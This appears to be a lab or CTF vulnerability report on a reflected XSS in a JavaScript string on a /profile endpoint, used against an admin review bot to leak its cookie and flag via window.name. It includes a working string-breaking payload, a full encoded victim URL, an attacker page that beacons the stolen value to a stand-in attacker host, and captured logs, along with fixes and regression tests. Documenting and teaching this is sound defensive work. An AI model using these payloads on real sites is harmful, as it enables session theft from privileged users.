# Reflected XSS In JavaScript String Leading To Admin Bot Cookie Disclosure

## Title

Reflected JavaScript-string XSS on `/profile` allows admin bot cookie disclosure via `window.name`

## Summary

The `message` query parameter is reflected into inline JavaScript on `/profile` without safe encoding for JavaScript-string context. An attacker can terminate the string, execute JavaScript, and abuse the `/share` admin-review flow to make the admin bot visit a same-origin malicious URL. In the observed browser/runtime, `window.name` survives a top-level cross-origin navigation, allowing attacker-controlled infrastructure to recover the admin cookie and flag.

## Scope

- Host: `1877bcf64628.pwnbox-lab.com`
- Endpoint: `GET /profile`
- Review flow: `POST /share`

## Severity Reasoning

High in the lab context because it leads to disclosure of privileged admin session data and the flag. In a real application, the same pattern could allow admin session theft, access to restricted content, or privileged actions through an internal support/review bot.

## Affected Endpoint

```text
GET /profile?message=...
```

Reflected sink:

```javascript
var message = "PAYLOAD";
```

## Preconditions

- Attacker can authenticate as a normal user.
- Attacker can submit a same-origin URL through `/share`.
- Admin bot visits the submitted URL in a privileged browser session.
- Sensitive cookie data is readable from JavaScript.

## Steps To Reproduce

1. Log in as a normal user.
2. Host an attacker page on a controlled origin that reads `window.name` and logs it.
3. Build a same-origin URL to `/profile` with the payload:

   ```text
   ";name=document.cookie;location='//[attacker-host]'//
   ```

4. Submit that URL through `/share`.
5. Wait for the admin bot to visit the URL.
6. Observe the attacker host logs for the follow-up request containing the encoded `window.name` value.

## Proof Of Concept

Victim URL:

```text
https://1877bcf64628.pwnbox-lab.com/profile?message=%22%3Bname%3Ddocument.cookie%3Blocation%3D%27//[attacker-host]%27//
```

Attacker page:

```html
<!doctype html><meta charset="utf-8"><title>x</title><body>loading<script>document.body.textContent=window.name||"empty";(new Image).src="/x?d="+encodeURIComponent(window.name||"empty")</script>
```

## Evidence

- Reflected input is inserted directly into executable JavaScript string context.
- `/share` accepted the same-origin malicious URL.
- Attacker logs recorded:

  ```text
  GET /
  GET /x?d=session%3D...%3B%20FLAG%3Dpwnbox%7B...%7D
  ```

- The second request proves the attacker page read `window.name` after the admin browser navigated cross-origin.

## Impact

- Disclosure of privileged admin cookie state.
- Recovery of lab flag from the admin browser session.
- Real-world risk of support/moderation/review bot session theft.

## Recommended Fix

- Do not interpolate untrusted input into inline JavaScript.
- Escape correctly for JavaScript-string context if interpolation is unavoidable.
- Set privileged cookies `HttpOnly`.
- Review untrusted content on a separate origin or in a stripped-down isolated bot session.
- Add tests for same-origin review flows and reflected parameters together.

## Regression Test

1. Verify quotes, slashes, and semicolons in `message` are rendered inertly.
2. Verify `/profile?message=";alert(1);//` cannot alter script execution.
3. Verify admin-review flows do not execute attacker-controlled same-origin script with privileged cookies.
4. Verify privileged cookies are not exposed to `document.cookie`.

## Timeline Notes

- Initial reflected sink and WAF restrictions confirmed.
- Early external-beacon approaches proved bot reachability but were less reliable.
- A fresh attacker subdomain plus same-site log collection confirmed the final cookie disclosure path.
